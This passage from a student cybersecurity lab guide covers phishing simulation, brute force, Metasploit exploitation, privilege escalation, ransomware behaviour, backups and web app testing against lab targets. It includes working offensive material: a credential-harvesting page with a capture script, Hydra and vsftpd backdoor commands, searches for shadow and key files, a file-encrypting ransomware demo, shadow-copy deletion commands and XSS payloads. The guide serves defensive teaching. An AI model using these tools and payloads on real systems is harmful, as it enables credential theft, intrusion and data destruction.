theHarvester -d targetdomain.com -b google,linkedin,bing

# Maltego (GUI) — relationship mapping of targets
```

**What you're learning:** How attackers build a complete picture of attack surface before touching anything. Every open port is a potential entry point.

---

### Lab 2: Phishing Simulation (Your Test Websites)

**Objective:** Understand credential harvesting attacks and how phishing pages work.

**Prerequisites:** Your MERN or PERN web app with a login page running locally.

**Step 1: Clone your own login page**

```bash
# Using SET (Social Engineering Toolkit) — Parrot OS includes this
sudo setoolkit
# Select: 1) Social-Engineering Attacks
# Select: 2) Website Attack Vectors
# Select: 3) Credential Harvester Attack Method
# Select: 2) Site Cloner
# Enter IP of your attack machine (localhost)
# Enter URL of YOUR OWN TEST SITE login page

# This clones the page and captures credentials entered
```

**Step 2: Manual phishing page (understanding the mechanics)**

```html
<!-- Simple credential harvester — deploy on YOUR OWN test server only -->
<!DOCTYPE html>
<html>
  <head>
    <title>Login</title>
  </head>
  <body>
    <h2>Company Login</h2>
    <form action="capture.php" method="POST">
      <input type="text" name="username" placeholder="Username" />
      <input type="password" name="password" placeholder="Password" />
      <button type="submit">Login</button>
    </form>
  </body>
</html>
```

```php
<?php
// capture.php — logs credentials for YOUR OWN test
$username = $_POST['username'];
$password = $_POST['password'];
$log = date('Y-m-d H:i:s') . " | User: $username | Pass: $password\n";
file_put_contents('captured.txt', $log, FILE_APPEND);
header("Location: https://your-real-test-site.com"); // redirect to real site
?>
```

**Step 3: Analyze phishing indicators**

```
Checklist of what makes phishing detectable:
  □ Domain name (typosquat: paypa1.com vs paypal.com)
  □ SSL certificate (no padlock, or cert for wrong domain)
  □ URL bar (shows the spoofed domain)
  □ Sender email address (hover over it)
  □ Grammar and spelling errors
  □ Urgency language
  □ Mismatched link URLs (hover before clicking)
  □ Unexpected email from known contact
```

**Step 4: GoPhish — full phishing campaign simulation**

```bash
# Install GoPhish
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish

# Access admin at: https://localhost:3333
# Default credentials: admin / gophish

# Create:
# 1. Sending Profile (your test SMTP server)
# 2. Landing Page (your cloned login page)
# 3. Email Template (the phishing email)
# 4. User & Group (test email addresses you own)
# 5. Campaign → Launch

# GoPhish tracks: emails sent, opened, links clicked, credentials submitted
```

---

### Lab 3: RDP / SSH Brute Force

**Objective:** Understand brute force attacks against authentication services.

**Target:** Metasploitable2 (SSH on port 22)

**Step 1: Identify service version**

```bash
nmap -sV -p 22 <METASPLOITABLE_IP>
# Should show: OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
```

**Step 2: Hydra SSH brute force**

```bash
# Using a small password list (fast demo)
hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt \
  ssh://<METASPLOITABLE_IP> -t 4 -V

# Try multiple usernames
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://<METASPLOITABLE_IP> -t 4

# Metasploit module
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <METASPLOITABLE_IP>
set USERNAME msfadmin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run
```

**Step 3: Medusa alternative**

```bash
medusa -h <METASPLOITABLE_IP> -u msfadmin \
  -P /usr/share/wordlists/metasploit/unix_passwords.txt -M ssh
```

**Step 4: FTP brute force (Metasploitable2)**

```bash
hydra -l anonymous -P /dev/null ftp://<METASPLOITABLE_IP>

# Or with credentials
hydra -l ftp -P /usr/share/wordlists/metasploit/unix_passwords.txt \
  ftp://<METASPLOITABLE_IP>
```

**Lesson:** The default Metasploitable2 credentials (`msfadmin:msfadmin`) appear in wordlists. This is why default credentials and weak passwords are catastrophic.

---

### Lab 4: Lateral Movement & Privilege Escalation

**Objective:** Simulate post-compromise behavior — moving deeper into a compromised network.

**Step 1: Initial compromise via Metasploit**

```bash
msfconsole

# vsftpd 2.3.4 backdoor (Metasploitable2)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <METASPLOITABLE_IP>
run
# If successful: shell opened as root

# UnrealIRCd backdoor (port 6667)
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <METASPLOITABLE_IP>
run
```

**Step 2: Post-exploitation information gathering**

```bash
# Once inside (Metasploit shell or SSH)

# Who am I?
whoami
id

# What system is this?
uname -a
cat /etc/os-release

# What users exist?
cat /etc/passwd
cat /etc/shadow  # (if root)

# Network interfaces (what else is reachable?)
ifconfig
ip route
netstat -tulnp

# What processes are running?
ps aux

# Look for interesting files
find / -name "*.conf" 2>/dev/null
find / -name "*.env" 2>/dev/null    # .env files with DB credentials!
find / -perm -4000 2>/dev/null      # SUID binaries (priv esc vectors)
```

**Step 3: Privilege escalation (on Metasploitable2)**

```bash
# Check sudo privileges
sudo -l

# Look for world-writable scripts run as root (cron jobs)
cat /etc/crontab
ls -la /etc/cron.*

# GTFOBins — if you can run certain binaries as sudo
# https://gtfobins.github.io/
# Example: if sudo nmap allowed:
sudo nmap --interactive
# Inside nmap: !sh  → root shell

# Metasploit local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION <session_id>
run
```

**Step 4: Simulate ransomware data staging**

```bash
# Find sensitive-looking files (what an attacker would target)
find / -name "*.sql" 2>/dev/null
find / -name "*.db" 2>/dev/null
find / -name "id_rsa" 2>/dev/null    # SSH private keys
find / -name "*.pem" 2>/dev/null     # SSL certs/keys
find / -name "*.key" 2>/dev/null
find / -name ".env" 2>/dev/null      # Environment files with secrets
find / -name "wp-config.php" 2>/dev/null  # WordPress DB creds
find / -name "config.js" 2>/dev/null      # Node.js configs
```

---

### Lab 5: Ransomware Behavior Analysis (Isolated VM)

**Objective:** Understand what ransomware actually does at the OS level — safely and in isolation.

> ⚠️ **CRITICAL:** This lab must be done in a **completely isolated VM** with:
>
> - No network adapter (or host-only with no internet)
> - No shared folders with your host
> - Snapshots taken BEFORE any malware runs
> - Never run actual malware samples on your host machine

**Step 1: Study file encryption mechanics (write your own safe demo)**

```python
#!/usr/bin/env python3
"""
EDUCATIONAL DEMO: Simulates how ransomware encrypts files.
This creates harmless encrypted copies in a TEST_DIR only.
Run ONLY in an isolated VM on test files you create yourself.
"""
from cryptography.fernet import Fernet
import os

# Generate a key (in real ransomware, this goes to attacker's C2 server)
key = Fernet.generate_key()
cipher = Fernet(key)

TEST_DIR = "/tmp/ransomware_demo_files"  # Only operate in this directory
os.makedirs(TEST_DIR, exist_ok=True)

# Create test files
test_files = ["document.txt", "spreadsheet.csv", "notes.txt"]
for f in test_files:
    with open(f"{TEST_DIR}/{f}", "w") as fp:
        fp.write(f"This is test content in {f}\n" * 10)

print(f"[*] Created test files in {TEST_DIR}")
print(f"[*] Encryption key: {key.decode()}")  # In real ransomware: sent to C2

# Simulate encryption
for filename in os.listdir(TEST_DIR):
    filepath = os.path.join(TEST_DIR, filename)
    if os.path.isfile(filepath) and not filename.endswith(".enc"):
        with open(filepath, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        enc_path = filepath + ".enc"
        with open(enc_path, "wb") as f:
            f.write(encrypted)
        os.remove(filepath)
        print(f"[+] Encrypted: {filename} → {filename}.enc")

# Drop ransom note
with open(f"{TEST_DIR}/README_DECRYPT.txt", "w") as f:
    f.write("YOUR FILES HAVE BEEN ENCRYPTED.\n")
    f.write("To decrypt, use the key stored above.\n")
    f.write("(In real ransomware: send Bitcoin to attacker to receive key)\n")

print("\n[*] Ransom note dropped.")
print("\n[*] Demo decryption key (keep this!):")
print(key.decode())
```

```python
#!/usr/bin/env python3
"""
DECRYPTOR for the above demo
"""
from cryptography.fernet import Fernet
import os

TEST_DIR = "/tmp/ransomware_demo_files"
key = input("Enter decryption key: ").encode()
cipher = Fernet(key)

for filename in os.listdir(TEST_DIR):
    if filename.endswith(".enc"):
        filepath = os.path.join(TEST_DIR, filename)
        with open(filepath, "rb") as f:
            data = f.read()
        decrypted = cipher.decrypt(data)
        original_path = filepath[:-4]  # Remove .enc
        with open(original_path, "wb") as f:
            f.write(decrypted)
        os.remove(filepath)
        print(f"[+] Decrypted: {filename} → {filename[:-4]}")
```

**Step 2: Study shadow copy deletion (how ransomware destroys backups)**

```powershell
# Understanding what real ransomware does to Windows shadow copies
# (Study only — do NOT run on any system you care about)

# What ransomware runs (in a Windows VM only for study purposes):
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
```

**Step 3: Use ANY.RUN sandbox for safe malware analysis**

```
1. Go to: https://app.any.run/
2. Upload a suspected malware sample (or use their public library)
3. Watch it execute in an isolated Windows VM
4. Observe:
   - Network connections made (C2 servers)
   - Files created/deleted/modified
   - Registry changes
   - Process tree
   - DNS queries
5. No local risk — all runs in their cloud sandbox
```

**Step 4: Analyze with Wireshark (C2 communication)**

```bash
# In your isolated VM lab, capture traffic during malware analysis
wireshark &
# Apply filter: ip.addr == <suspicious_IP>
# Look for:
# - Beaconing (regular interval connections to same IP)
# - DNS queries to strange domains
# - Large outbound data transfers (exfiltration)
# - Encrypted traffic to non-HTTPS ports (C2)
```

---

### Lab 6: Backup & Recovery Drill

**Objective:** Prove your backups work before you need them.

**Step 1: Set up automated backup (Linux)**

```bash
#!/bin/bash
# backup_script.sh
# Backs up your MERN/PERN project files

BACKUP_SOURCE="/home/user/projects"
BACKUP_DEST="/mnt/external_drive/backups"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_NAME="backup_${TIMESTAMP}.tar.gz"

# Create compressed archive
tar -czf "${BACKUP_DEST}/${BACKUP_NAME}" "${BACKUP_SOURCE}"

# Keep only last 7 backups
ls -t "${BACKUP_DEST}"/backup_*.tar.gz | tail -n +8 | xargs rm -f

echo "[$(date)] Backup completed: ${BACKUP_NAME}" >> /var/log/backup.log
```

```bash
# Add to crontab (daily at 2AM)
crontab -e
# Add line:
0 2 * * * /home/user/scripts/backup_script.sh
```

**Step 2: Database backup (MongoDB)**

```bash
# Backup MongoDB database
mongodump --db myapp --out /backup/mongo_$(date +%Y%m%d)

# Restore test
mongorestore --db myapp_restored /backup/mongo_20241201/myapp

# Verify restore
mongo myapp_restored --eval "db.getCollectionNames()"
```

**Step 3: Database backup (PostgreSQL)**

```bash
# Backup PostgreSQL
pg_dump myapp_db > /backup/pg_$(date +%Y%m%d).sql

# Restore test (to a test DB)
createdb myapp_test
psql myapp_test < /backup/pg_20241201.sql

# Verify
psql myapp_test -c "\dt"  # List tables
psql myapp_test -c "SELECT count(*) FROM users;"  # Row count check
```

**Step 4: Simulate ransomware impact and recover**

```bash
# SIMULATION: In a test directory, rename all files (mimics encryption)
mkdir /tmp/recovery_test
cp -r /home/user/projects/small_project /tmp/recovery_test/original

# Simulate "encryption" (just rename them)
for f in /tmp/recovery_test/original/**; do
  mv "$f" "$f.encrypted" 2>/dev/null
done

echo "Files 'encrypted'. Now recover from backup..."

# Restore from backup
tar -xzf /backup/backup_latest.tar.gz -C /tmp/recovery_test/restored

# Verify all files restored correctly
diff -r /tmp/recovery_test/original_pre_encrypt /tmp/recovery_test/restored

echo "Recovery test complete!"
```

---

### Lab 7: Web App Vulnerability Testing (Your MERN/PERN Sites)

**Objective:** Find and fix common web vulnerabilities in your own applications before an attacker does.

> Run these ONLY against your own locally-hosted test applications.

**Step 1: OWASP Top 10 testing with OWASP ZAP**

```bash
# Install ZAP (Zed Attack Proxy)
# Available on Parrot OS or: https://www.zaproxy.org/download/

# Automated scan of your local test site
zap-cli quick-scan --self-contained \
  --start-options '-config api.disablekey=true' \
  http://localhost:3000

# Or use ZAP GUI:
# Tools → Active Scan → enter your app URL
# Review findings sorted by risk level
```

**Step 2: SQL Injection testing (your PERN app)**

```bash
# sqlmap against your own test application
# Only on URLs/forms you own!

# Basic test
sqlmap -u "http://localhost:3000/api/users?id=1" --dbs

# Test POST form
sqlmap -u "http://localhost:3000/api/login" \
  --data="username=admin&password=test" \
  --level=3 --risk=2

# What to look for in your Node.js/Express code:
```

```javascript
// VULNERABLE (SQL injection possible)
app.get('/user', async (req, res) => {
  const { id } = req.query
  const result = await pool.query(`SELECT * FROM users WHERE id = ${id}`)
  //                                                              ^^^^
  //                              User input directly in query — DANGER
  res.json(result.rows)
})

// SECURE (parameterized query)
app.get('/user', async (req, res) => {
  const { id } = req.query
  const result = await pool.query('SELECT * FROM users WHERE id = $1', [id])
  //                               ^^^^                            ^^^
  //                     Parameterized — user input never touches SQL string
  res.json(result.rows)
})
```

**Step 3: XSS testing (your MERN app)**

```javascript
// Test payloads for your own forms
// Enter these in your app's input fields:

// Basic reflected XSS
<script>alert('XSS')</script>

// Attribute injection
" onmouseover="alert('XSS')

// More evasive
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// If these pop an alert, your app is vulnerable to XSS
```

```javascript
// Fix in React — React escapes by default, but watch out for:

// VULNERABLE:
const UserComment = ({ comment }) => (
  <div dangerouslySetInnerHTML={{ __html: comment }} /> // NEVER DO THIS with user input
)

// SECURE:
const UserComment = ({ comment }) => (
  <div>{comment}</div> // React auto-escapes this
)

// For rich text: use DOMPurify to sanitize
import DOMPurify from 'dompurify'
const safe = DOMPurify.sanitize(userInput)
```

**Step 4: Authentication testing**

```bash
# Test for weak JWT implementation
# Intercept your JWT with Burp Suite
# Check jwt.io to decode

# Common JWT vulnerabilities:
# 1. alg:none attack
# 2. Weak secret (brute-force with hashcat)
# 3. Not validating expiry

# Hashcat JWT crack (on JWTs from your own app only)
hashcat -a 0 -m 16500 <your_jwt_token> /usr/share/wordlists/rockyou.txt
```

**Step 5: Dependency vulnerability scanning**

```bash
# Check your Node.js project for known vulnerable packages
npm audit

# More detailed output
npm audit --audit-level=moderate

# Auto-fix safe updates
npm audit fix

# Check specific package
npm ls <package-name>

# Snyk scan (more comprehensive)
npx snyk test

# Python equivalent
pip install safety
safety check
```

**Step 6: Nikto web server scan**

```bash
# Scan your local test server
nikto -h http://localhost:3000

# Will find:
# - Missing security headers
# - Exposed .env files
# - Open directory listings
# - Default files left on server
# - Dangerous HTTP methods enabled (PUT, DELETE, TRACE)
```

**Step 7: Security headers check**

```bash
# Check what security headers your app sends
curl -I http://localhost:3000

# Should see (add if missing):
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Content-Security-Policy: default-src 'self'
# Strict-Transport-Security: max-age=31536000
# Referrer-Policy: no-referrer
```

```javascript
// Add security headers in Express.js with Helmet
const helmet = require('helmet')
app.use(helmet())

// Or manually:
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('X-Frame-Options', 'DENY')
  res.setHeader('Content-Security-Policy', "default-src 'self'")
  next()
})
```

---

## 16. Glossary

| Term                      | Definition                                                                     |
| ------------------------- | ------------------------------------------------------------------------------ |
| **AES**                   | Advanced Encryption Standard — symmetric cipher used in modern ransomware      |
| **Air-gap**               | Physical isolation of a system from unsecured networks                         |
| **BEC**                   | Business Email Compromise — impersonating executives via email                 |
| **Bitcoin**               | Decentralized digital currency; anonymity made ransomware financially viable   |
| **Botnet**                | Network of compromised machines controlled by an attacker                      |
| **Brute Force**           | Systematically trying all possible passwords                                   |
| **C2 / C&C**              | Command and Control server — attacker's remote control infrastructure          |
| **CVSS**                  | Common Vulnerability Scoring System — rates vulnerability severity 0–10        |
| **Credential Stuffing**   | Using breached username/password pairs on other services                       |
| **CVE**                   | Common Vulnerabilities and Exposures — standardized vulnerability IDs          |
| **Dark Web**              | Tor-accessible hidden services; used for ransomware payment portals            |
| **Drive-by Download**     | Malware installed by visiting a website without any user interaction           |
| **Double Extortion**      | Stealing data before encrypting, then threatening to publish it                |
| **EDR**                   | Endpoint Detection & Response — advanced AV that monitors behaviors            |
| **Exfiltration**          | Unauthorized data transfer out of an organization                              |
| **GDPR**                  | General Data Protection Regulation — EU data privacy law                       |
| **IoT**                   | Internet of Things — smart devices with embedded connectivity                  |
| **Lateral Movement**      | Attacker moves from initial foothold to other network systems                  |
| **Least Privilege**       | Give users only the minimum access required for their role                     |
| **Mimikatz**              | Tool for extracting plaintext credentials from Windows memory                  |
| **MFA / 2FA**             | Multi/Two-Factor Authentication — requires second verification                 |
| **Monero**                | Privacy-focused cryptocurrency increasingly preferred by ransomware groups     |
| **NLA**                   | Network Level Authentication — RDP security hardening feature                  |
| **NotPetya**              | 2017 Russian state-sponsored wiper disguised as ransomware                     |
| **OSINT**                 | Open Source Intelligence — publicly available information gathering            |
| **Payload**               | The malicious code component of an attack                                      |
| **Pen Test**              | Penetration Test — authorized simulated attack to find vulnerabilities         |
| **Phishing**              | Deceptive emails tricking users into revealing credentials or running malware  |
| **Public-Key Encryption** | Asymmetric crypto where encryption key is public; decryption key is private    |
| **RaaS**                  | Ransomware as a Service — affiliate model for deploying ransomware             |
| **RDP**                   | Remote Desktop Protocol — Windows remote access (port 3389)                    |
| **Reconnaissance**        | Information gathering phase of an attack                                       |
| **RSA**                   | Asymmetric encryption algorithm; computationally infeasible to break           |
| **Shadow Copies**         | Windows backup snapshots; ransomware deletes these before encrypting           |
| **Shodan**                | Search engine for internet-connected devices and services                      |
| **SMB**                   | Server Message Block — Windows file sharing protocol (EternalBlue target)      |
| **Social Engineering**    | Psychological manipulation to trick humans into enabling attacks               |
| **Spear Phishing**        | Targeted phishing using personalized information about the victim              |
| **TOTP**                  | Time-based One-Time Password — changes every 30 seconds (Google Authenticator) |
| **Triple Extortion**      | Extending extortion to the victim's own customers or patients                  |
| **Vishing**               | Voice phishing — social engineering via phone call                             |
| **VPN**                   | Virtual Private Network — encrypted tunnel for remote access                   |
| **Zero-Day**              | Vulnerability unknown to the vendor; no patch exists yet                       |

---

## 17. Certifications & Further Learning

### Certifications Roadmap for Cybersecurity Students

```
BEGINNER                   INTERMEDIATE               ADVANCED
════════════              ═══════════════            ══════════════
CompTIA Security+         CEH (EC-Council)           OSCP (OffSec)
CompTIA Network+          CHFI (EC-Council)          CISSP (ISC²)
CompTIA A+                eJPT (eLearnSecurity)      GREM (SANS)
                          GCIA (SANS)                GWAPT (SANS)
                          AWS Security Specialty     CISM (ISACA)
```

### Practice Platforms

| Platform                    | Focus                            | Cost        |
| --------------------------- | -------------------------------- | ----------- |
| **TryHackMe**               | Guided rooms, beginner-friendly  | Free + paid |
| **Hack The Box**            | CTF-style, intermediate–advanced | Free + paid |
| **CyberDefenders**          | Blue team / SOC analyst focus    | Free        |
| **Blue Team Labs Online**   | Incident response, forensics     | Free + paid |
| **VulnHub**                 | Downloadable vulnerable VMs      | Free        |
| **PortSwigger Web Academy** | Web app security (OWASP Top 10)  | Free        |
| **PentesterLab**            | Web + code review                | Free + paid |

### No More Ransom Project

> **https://www.nomoreransom.org/**
>
> Run by Europol, the Dutch National Police, Kaspersky, and McAfee.
> Provides free decryptors for dozens of known ransomware variants.
> Check here before paying any ransom.

### Key Tools Reference

| Category         | Tool                          | Purpose                                 |
| ---------------- | ----------------------------- | --------------------------------------- |
| Scanning         | Nmap                          | Port/service/OS scanning                |
| Scanning         | Nikto                         | Web server vulnerability scanning       |
| Scanning         | OpenVAS                       | Network vulnerability scanner           |
| Web Testing      | OWASP ZAP                     | Automated web app vulnerability scanner |
| Web Testing      | Burp Suite                    | Manual web app intercepting proxy       |
| Web Testing      | sqlmap                        | Automated SQL injection testing         |
| Brute Force      | Hydra                         | Multi-protocol brute force              |
| Brute Force      | Medusa                        | Parallel brute force                    |
| Brute Force      | Hashcat                       | Offline hash cracking                   |
| Exploitation     | Metasploit                    | Framework for known exploits            |
| Post-Exploit     | Mimikatz                      | Windows credential extraction           |
| OSINT            | theHarvester                  | Email/domain information gathering      |
| OSINT            | Maltego                       | Visual relationship mapping             |
| Phishing         | GoPhish                       | Phishing campaign simulation            |
| Phishing         | SET (Social Engineer Toolkit) | Social engineering attacks              |
| Traffic Analysis | Wireshark                     | Packet capture and analysis             |
| Malware Analysis | ANY.RUN                       | Cloud-based malware sandbox             |
| Password Manager | Bitwarden                     | Open-source password vault              |
| MFA              | Authy / Google Auth           | TOTP code generation                    |
| Backup           | rsync                         | Efficient file synchronization          |

---

_Notes compiled from Hacking Books Course video transcripts_
_University Cybersecurity Department — Student Reference Document_
_Last updated: 2024_
_All lab work conducted in authorized environments: personal test systems, own websites, and Metasploitable2 VM_
